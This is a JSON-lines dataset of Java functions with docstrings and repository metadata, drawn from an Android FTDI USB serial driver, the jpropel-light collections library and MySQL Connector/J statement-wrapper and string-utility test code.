{"docstring": "// FIXME ISSUE: When re-connect usb, cannot acvive cdc.\n", "func_signal": "private void initCdcAcm(UsbDeviceConnection conn, int baudrate)", "code": "{\n    int ret;\n    if (!conn.claimInterface(mInterface[0], true)) {\n        return;\n    }\n\n    ret = conn.controlTransfer(0x21, 0x22, 0x00, 0, null, 0, 0);\n\n    setCdcBaudrate(baudrate);\n    // ret = conn.controlTransfer(0x21, 0x20, 0, 0, new byte[] { (byte)\n    // 0x80,\n    // 0x25, 0x00, 0x00, 0x00, 0x00, 0x08 }, 7, 0);\n\n    isCDC = true;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Sets the serial property of parity bit\n * \n * @param parity none : FTDI_SET_DATA_PARITY_NONE odd :\n *            FTDI_SET_DATA_PARITY_ODD even : FTDI_SET_DATA_PARITY_EVEN mark\n *            : FTDI_SET_DATA_PARITY_MARK space : FTDI_SET_DATA_PARITY_SPACE\n * @param channel CH_A CH_B CH_C CH_D\n * @return true : succeed, false : not succeed\n */\n", "func_signal": "public boolean setSerialPropertyParity(int parity, int channel)", "code": "{\n    // TODO : test this method\n    if (parity == FTDI_SET_DATA_PARITY_NONE\n            || parity == FTDI_SET_DATA_PARITY_ODD\n            || parity == FTDI_SET_DATA_PARITY_EVEN\n            || parity == FTDI_SET_DATA_PARITY_MARK\n            || parity == FTDI_SET_DATA_PARITY_SPACE) {\n        mSerialProperty[channel - 1] = (mSerialProperty[channel - 1] & 0xF8FF)\n                | (parity & 0x0700);\n        if(LOCAL_LOGV){ Log.v(TAG, \"setSerialPropertyParity : \" + toHexStr(mSerialProperty[channel-1])); }\n        return true;\n    } else {\n        return false;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Writes n byte Binary Data to n channel\n * \n * @param buf : write buffer\n * @param length : write length\n * @param channel : write channel\n * @return written length\n */\n", "func_signal": "public int write(byte[] buf, int length, int channel)", "code": "{\n    if (channel >= mSelectedDeviceInfo.mNumOfChannels) {\n        return -1;\n    }\n    int offset = 0;\n    int actual_length;\n    byte[] write_buf = new byte[WRITEBUF_SIZE];\n    // byte[] tmp_buf=new byte[WRITEBUF_SIZE];\n\n    while (offset < length) {\n        int write_size = WRITEBUF_SIZE;\n\n        if (offset + write_size > length) {\n            write_size = length - offset;\n        }\n        System.arraycopy(buf, offset, write_buf, 0, write_size);\n        // ByteArrayInputStream write_buf = new ByteArrayInputStream(buf);\n        // write_buf.read(tmp_buf, offset, write_size);\n\n        actual_length = mDeviceConnection.bulkTransfer(\n                mFTDIEndpointOUT[channel], write_buf, write_size, 0);\n\n        if (actual_length < 0) {\n            return -1;\n        }\n        offset += actual_length;\n    }\n\n    return offset;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// when insert the device USB plug into a USB port\n", "func_signal": "public boolean usbAttached(Intent intent)", "code": "{\n    UsbDevice device = (UsbDevice) intent\n            .getParcelableExtra(UsbManager.EXTRA_DEVICE);\n    return getUsbInterfaces(device);\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// when remove the device USB plug from a USB port\n", "func_signal": "public void usbDetached(Intent intent)", "code": "{\n    UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);\n    String deviceName = device.getDeviceName();\n    if (mDevice != null && mDevice.equals(deviceName)) {\n        Log.d(TAG, \"USB interface removed\");\n        setUSBInterface(null, null, 0);\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// Initial control transfer\n", "func_signal": "private void initFTDIChip(UsbDeviceConnection conn, int baudrate)", "code": "{\n\n    for (int i = 0; i < mSelectedDeviceInfo.mNumOfChannels; ++i) {\n        int index = i + 1;\n        conn.controlTransfer(0x40, 0, 0, index, null, 0, 0); // reset\n        conn.controlTransfer(0x40, 0, 1, index, null, 0, 0); // clear Rx\n        conn.controlTransfer(0x40, 0, 2, index, null, 0, 0); // clear Tx\n        conn.controlTransfer(0x40, 0x02, 0x0000, index, null, 0, 0); // flow\n        // control\n        // none\n        setBaudrate(baudrate, index);\n        conn.controlTransfer(0x40, 0x04, 0x0008, index, null, 0, 0); // data\n        // bit\n        // 8,\n        // parity\n        // none,\n        // stop\n        // bit\n        // 1,\n        // tx\n        // off\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Sets the serial properties to an FTDI chip register\n * \n * @param channel CH_A CH_B CH_C CH_D\n * @return true : succeed, false : not succeed\n */\n", "func_signal": "public boolean setSerialPropertyToChip(int channel)", "code": "{\n    // TODO : test this method\n    if (mDeviceConnection == null) {\n        return false;\n    }\n\n    if (isCDC) {\n        // setCdcSerialPropertyToChip();\n        return true;\n    }\n\n    if (CH_A > channel || channel > CH_D) {\n        return false;\n    }\n\n    if (mDeviceConnection.controlTransfer(0x40, 0x04,\n            mSerialProperty[channel - 1], channel, null, 0, 0) < 0) {\n        return false;\n    } else {\n        if(LOCAL_LOGV){ Log.v(TAG, \"setSerialPropertyToChip : \" + toHexStr(mSerialProperty[channel-1])); }\n        return true;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Sets the serial property of data bit\n * \n * @param numOfDataBit : number of data bit(8 or 7)\n * @param channel CH_A CH_B CH_C CH_D\n * @return true : succeed, false : not succeed\n */\n", "func_signal": "public boolean setSerialPropertyDataBit(int numOfDataBit, int channel)", "code": "{\n    // TODO : test this method\n    if ((0 < numOfDataBit) || (numOfDataBit <= 8)) {\n        mSerialProperty[channel - 1] = (mSerialProperty[channel - 1] & 0xFFF0)\n                | (numOfDataBit & 0x000F);\n        if(LOCAL_LOGV){ Log.v(TAG, \"setSerialPropertyDataBit : \" + toHexStr(mSerialProperty[channel-1])); }\n        return true;\n    } else {\n        return false;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Sets the serial property of stop bits\n * \n * @param stopBits 1 : FTDI_SET_DATA_STOP_BITS_1 1.5 :\n *            FTDI_SET_DATA_STOP_BITS_15 2 : FTDI_SET_DATA_STOP_BITS_2\n * @param channel CH_A CH_B CH_C CH_D\n * @return true : succeed, false : not succeed\n */\n", "func_signal": "public boolean setSerialPropertyStopBits(int stopBits, int channel)", "code": "{\n    // TODO : test this method\n    if (stopBits == FTDI_SET_DATA_STOP_BITS_1\n            || stopBits == FTDI_SET_DATA_STOP_BITS_15\n            || stopBits == FTDI_SET_DATA_STOP_BITS_2) {\n        mSerialProperty[channel - 1] = (mSerialProperty[channel - 1] & 0xE7FF)\n                | (stopBits & 0x1800);\n        if(LOCAL_LOGV){ Log.v(TAG, \"setSerialPropertyStopBits : \" + toHexStr(mSerialProperty[channel-1])); }\n        return true;\n    } else {\n        return false;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Predicate returning true when the function argument contains any of the given items\n * \n * @throws NullPointerException When an argument is null\n */\n", "func_signal": "@Validate\npublic static Predicate1<Iterable> containsAny(@NotNull final Iterable _items)", "code": "{\n  return new Predicate1<Iterable>() {\n    @Override\n    public boolean evaluate(final Iterable element)\n    {\n      return Linq.containsAny(element, _items);\n    }\n  };\n}", "path": "src\\propel\\core\\functional\\predicates\\Iterables.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Puts all elements in an array and returns them. This is an O(nlog2(n)) operation.\n */\n", "func_signal": "@Override\npublic T[] toArray()", "code": "{\n  lock();\n  try\n  {\n    return expiries.getKeys().toArray();\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Removes an item from the collection. Returns true if item was found and removed. This is an O(log2(n)) operation.\n * \n * @throws NullPointerException When the item is null.\n */\n", "func_signal": "@Override\npublic boolean remove(T item)", "code": "{\n  if (item == null)\n    throw new NullPointerException(\"item\");\n\n  lock();\n  try\n  {\n    return expiries.remove(item);\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Predicate returning true when the length is less than a specified value\n * \n * @throws NullPointerException When an argument is null\n */\n", "func_signal": "@SuppressWarnings(\"rawtypes\")\npublic static Predicate1<Iterable> lengthLessThan(final int _len)", "code": "{\n  return new Predicate1<Iterable>() {\n    @Override\n    @SuppressWarnings(\"unchecked\")\n    public boolean evaluate(final Iterable element)\n    {\n      return _len >= 0 && Linq.count(element) < _len;\n    }\n  };\n}", "path": "src\\propel\\core\\functional\\predicates\\Iterables.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Returns true if this collection contains the specified element. This is an O(log2(n)) operation.\n * \n * @param item Element whose presence in this collection is to be tested.\n * \n * @return True if this collection contains the specified element.\n * \n * @throws ClassCastException The item is not of correct type.\n * @throws NullPointerException The specified element is null.\n */\n", "func_signal": "@Override\npublic boolean contains(Object item)", "code": "{\n  if (item == null)\n    throw new NullPointerException(\"item\");\n\n  AvlNode<TKey, TValue> p = dictionary.root;\n\n  if (p == null)\n    return false;\n\n  while (p.left != null)\n    p = p.left;\n\n  while (true)\n  {\n    if (item.equals(p.item.getValue()))\n      return true;\n\n    if (p.right == null)\n    {\n      while (true)\n      {\n        if (p.parent == null)\n          return false;\n\n        if (p != p.parent.right)\n          break;\n\n        p = p.parent;\n      }\n\n      p = p.parent;\n    } else\n    {\n      p = p.right;\n\n      while (p.left != null)\n        p = p.left;\n    }\n  }\n\n  // // item == null\n  // while(true)\n  // {\n  // if(p.item.getValue() == null)\n  // return true;\n  //\n  // if(p.right == null)\n  // {\n  // while(true)\n  // {\n  // if(p.parent == null)\n  // return false;\n  //\n  // if(p != p.parent.right)\n  // break;\n  //\n  // p = p.parent;\n  // }\n  //\n  // p = p.parent;\n  // }\n  // else\n  // {\n  // p = p.right;\n  //\n  // while(p.left != null)\n  // p = p.left;\n  // }\n  // }\n}", "path": "src\\propel\\core\\collections\\maps\\avl\\ValueCollection.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Overloaded constructor, initializes session with a session expiration time and polling interval in milliseconds. Set to\n * CONSTANT.TIMEOUT_INFINITE to disable expiration.\n * \n * @throws IllegalArgumentException When the values provided are out of range.\n * @throws NullPointerException When the generic type parameter is null.\n */\n", "func_signal": "public ValueSessionStore(int expirationMillis, int pollingIntervalMillis, Class<?> genericTypeParameter)", "code": "{\n  setExpirationMillis(expirationMillis);\n  setPollingIntervalMillis(pollingIntervalMillis);\n\n  reEntrantLock = new ReentrantLock();\n  expiries = new AvlHashtable<T, LocalDateTime>(genericTypeParameter, LocalDateTime.class);\n\n  // daemon timer\n  expirationTimer = new Timer(true);\n\n  // check if expiration is enabled\n  if (expirationMillis >= 0)\n    expirationTimer.scheduleAtFixedRate(new ExpirationCheckingTimerTask(), new LocalDateTime().plusMillis(expirationMillis).toDateTime()\n        .toDate(), pollingIntervalMillis);\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Overloaded constructor, initializes session with a session expiration time and polling interval in milliseconds. Set to\n * CONSTANT.TIMEOUT_INFINITE to disable expiration.\n * \n * @throws IllegalArgumentException When the values provided are out of range.\n * @throws SuperTypeTokenException When called without using anonymous class semantics.\n */\n", "func_signal": "public ValueSessionStore(int expirationMillis, int pollingIntervalMillis)", "code": "{\n  setExpirationMillis(expirationMillis);\n  setPollingIntervalMillis(pollingIntervalMillis);\n\n  reEntrantLock = new ReentrantLock();\n  expiries = new AvlHashtable<T, LocalDateTime>(SuperTypeToken.getClazz(this.getClass(), 0), LocalDateTime.class);\n\n  // daemon timer\n  expirationTimer = new Timer(true);\n\n  // check if expiration is enabled\n  if (expirationMillis >= 0)\n    expirationTimer.scheduleAtFixedRate(new ExpirationCheckingTimerTask(), new LocalDateTime().plusMillis(expirationMillis).toDateTime()\n        .toDate(), pollingIntervalMillis);\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Returns true if an item is contained in the collection. This is an O(log2(n)) operation.\n * \n * @throws NullPointerException When the item is null.\n */\n", "func_signal": "@Override\npublic boolean contains(T item)", "code": "{\n  if (item == null)\n    throw new NullPointerException(\"item\");\n\n  lock();\n  try\n  {\n    return expiries.containsKey(item);\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Predicate returning true when the function argument contains an item\n * \n * @throws NullPointerException When an argument is null\n */\n", "func_signal": "@Validate\npublic static Predicate1<Iterable> contains(@NotNull final Object _item)", "code": "{\n  return new Predicate1<Iterable>() {\n    @Override\n    public boolean evaluate(final Iterable element)\n    {\n      return Linq.contains(element, _item);\n    }\n  };\n}", "path": "src\\propel\\core\\functional\\predicates\\Iterables.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Returns the key of all key/value pairs, in ascending key order. This is an O(n) operation.\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\n@Override\npublic TValue[] toArray()", "code": "{\n  int size = size();\n  TValue[] result = (TValue[]) Array.newInstance(getGenericTypeParameter(), size);\n\n  Iterator<TValue> iterator = iterator();\n  for (int i = 0; i < size; i++)\n    result[i] = iterator.next();\n\n  return result;\n}", "path": "src\\propel\\core\\collections\\maps\\avl\\ValueCollection.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Clears the collection. This is an O(1) operation.\n */\n", "func_signal": "@Override\npublic void clear()", "code": "{\n  lock();\n  try\n  {\n    expiries.clear();\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Adds an item to the collection Returns true if successful. This is an O(log2(n)) operation.\n * \n * @throws NullPointerException When the item is null.\n */\n", "func_signal": "@Override\npublic boolean add(T item)", "code": "{\n  if (item == null)\n    throw new NullPointerException(\"item\");\n\n  lock();\n  try\n  {\n    return expiries.add(item, new LocalDateTime().plusMillis(expirationMillis));\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Predicate returning true when the function argument contains all items\n * \n * @throws NullPointerException When an argument is null\n */\n", "func_signal": "@Validate\npublic static Predicate1<Iterable> containsAll(@NotNull final Iterable _items)", "code": "{\n  return new Predicate1<Iterable>() {\n    @Override\n    public boolean evaluate(final Iterable element)\n    {\n      return Linq.containsAll(element, _items);\n    }\n  };\n}", "path": "src\\propel\\core\\functional\\predicates\\Iterables.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Expires the time of a session item, i.e. removes the item from the collection. This is an O(log2(n)) operation.\n * \n * @throws NullPointerException When the item is null.\n */\n", "func_signal": "@Override\npublic boolean expire(T item)", "code": "{\n  if (item == null)\n    throw new NullPointerException(\"item\");\n\n  lock();\n  try\n  {\n    return expiries.replace(item, new LocalDateTime());\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Puts all elements in a list and returns them. This is an O(nlog2(n)) operation.\n */\n", "func_signal": "@Override\npublic ReifiedList<T> toList()", "code": "{\n  lock();\n  try\n  {\n    return expiries.getKeys().toList();\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Predicate returning true when the length equals to specified value\n * \n * @throws NullPointerException When an argument is null\n */\n", "func_signal": "@SuppressWarnings(\"rawtypes\")\npublic static Predicate1<Iterable> lengthEquals(final int _len)", "code": "{\n  return new Predicate1<Iterable>() {\n    @Override\n    @SuppressWarnings(\"unchecked\")\n    public boolean evaluate(final Iterable element)\n    {\n      return _len >= 0 && Linq.count(element) == _len;\n    }\n  };\n}", "path": "src\\propel\\core\\functional\\predicates\\Iterables.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Renews the session expiration time for an item. Returns true if the item was found and refreshed. This is an O(log2(n)) operation.\n * \n * @throws NullPointerException When the item is null.\n */\n", "func_signal": "@Override\npublic boolean refresh(T item)", "code": "{\n  if (item == null)\n    throw new NullPointerException(\"item\");\n\n  lock();\n  try\n  {\n    return expiries.replace(item, new LocalDateTime().plusMillis(expirationMillis));\n  }\n  finally\n  {\n    unlock();\n  }\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Predicate returning true when the length is less than or equal to a specified value\n * \n * @throws NullPointerException When an argument is null\n */\n", "func_signal": "@SuppressWarnings(\"rawtypes\")\npublic static Predicate1<Iterable> lengthLessThanOrEqual(final int _len)", "code": "{\n  return new Predicate1<Iterable>() {\n    @Override\n    @SuppressWarnings(\"unchecked\")\n    public boolean evaluate(final Iterable element)\n    {\n      return _len >= 0 && Linq.count(element) <= _len;\n    }\n  };\n}", "path": "src\\propel\\core\\functional\\predicates\\Iterables.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Sets the duration of a session in milliseconds. If the value is CONSTANT.TIMEOUT_INFINITE then there is no expiration.\n * \n * @throws IllegalArgumentException When the period is a negative but not CONSTANT.TIMEOUT_INFINITE\n */\n", "func_signal": "protected void setExpirationMillis(int value)", "code": "{\n  if ((value != CONSTANT.TIMEOUT_INFINITE) && (value < 0))\n    throw new IllegalArgumentException(\"The expiration period can either be CONSTANT.TIMEOUT_INFINITE, or a positive number: \" + value);\n  this.expirationMillis = value;\n}", "path": "src\\propel\\core\\collections\\volatiles\\ValueSessionStore.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Initializes with a new value collection. This is an O(1) operation.\n */\n", "func_signal": "public ValueCollection(AvlHashtable<TKey, TValue> dictionary, Class<?> genericTypeParameterValue)", "code": "{\n  this.dictionary = dictionary;\n  this.genericTypeParameter = genericTypeParameterValue;\n}", "path": "src\\propel\\core\\collections\\maps\\avl\\ValueCollection.java", "repo_name": "nicholas22/jpropel-light", "stars": 125, "license": "None", "language": "java", "size": 31723}
{"docstring": "/**\n * Tests StringUtil.indexOfQuoteDoubleAware() method\n * \n * @throws Exception\n */\n", "func_signal": "public void testIndexOfQuoteDoubleAware() throws Exception", "code": "{\n    final String[] searchInDoubledQt = new String[] { \"A 'strange' \\\"STRONG\\\" `SsStRiNg` to be searched in\",\n            \"A ''strange'' \\\"\\\"STRONG\\\"\\\" ``SsStRiNg`` to be searched in\" };\n\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(null, null, 0));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(null, \"'\", 0));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(\"abc\", null, 0));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(\"abc\", \"\", 0));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(\"abc\", \"bcd\", 0));\n    assertEquals(0, StringUtils.indexOfQuoteDoubleAware(\"abc\", \"abc\", 0));\n\n    int qtPos = 0;\n    assertEquals(2, qtPos = StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"'\", 0));\n    assertEquals(10, qtPos = StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"'\", qtPos + 1));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"'\", qtPos + 1));\n    assertEquals(12, qtPos = StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"\\\"\", 0));\n    assertEquals(19, qtPos = StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"\\\"\", qtPos + 1));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"\\\"\", qtPos + 1));\n    assertEquals(21, qtPos = StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"`\", 0));\n    assertEquals(30, qtPos = StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"`\", qtPos + 1));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[0], \"`\", qtPos + 1));\n\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[1], \"'\", 0));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[1], \"\\\"\", 0));\n    assertEquals(-1, StringUtils.indexOfQuoteDoubleAware(searchInDoubledQt[1], \"`\", 0));\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\testsuite\\simple\\StringUtilsTest.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getFetchDirection()\n */\n", "func_signal": "public int getFetchDirection() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.getFetchDirection();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return ResultSet.FETCH_FORWARD; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getMaxFieldSize()\n */\n", "func_signal": "public int getMaxFieldSize() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.getMaxFieldSize();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return 0; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#executeQuery(java.lang.String)\n */\n", "func_signal": "public ResultSet executeQuery(String sql) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n\n            ResultSet rs = this.wrappedStmt.executeQuery(sql);\n            ((com.mysql.jdbc.ResultSetInternalMethods) rs).setWrapperStatement(this);\n\n            return rs;\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return null; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getGeneratedKeys()\n */\n", "func_signal": "public ResultSet getGeneratedKeys() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.getGeneratedKeys();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return null; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getQueryTimeout()\n */\n", "func_signal": "public int getQueryTimeout() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.getQueryTimeout();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return 0;\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#executeUpdate(java.lang.String,\n * java.lang.String[])\n */\n", "func_signal": "public int executeUpdate(String sql, String[] columnNames) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.executeUpdate(sql, columnNames);\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return -1; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
